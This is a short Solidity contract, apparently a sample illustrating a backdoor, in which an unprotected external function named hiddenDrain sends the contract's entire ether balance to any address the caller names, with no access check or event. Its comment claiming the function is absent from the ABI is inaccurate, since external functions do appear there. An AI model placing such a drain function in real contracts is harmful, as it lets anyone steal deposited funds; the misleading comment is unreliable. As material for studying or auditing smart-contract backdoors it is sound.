// Not exposed in the UI/ABI, but callable via low-level interface
contract HiddenFunctionBackdoor {
    function hiddenDrain(address to) external {
        // 🚨 No event, no exposure in interface
        to.call{value: address(this).balance}("");
    }

    receive() external payable {}
}
